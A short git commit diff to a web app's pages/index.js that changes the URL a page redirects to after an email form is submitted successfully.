3b111495829ae58083e57b998529aa1944dce280
husknet <127146284+husknet@users.noreply.github.com>
2024-12-18 17:19:00 +0000

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://em.abruis.io';
+        window.location.href = 'https://el.cinco-austra.pro';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
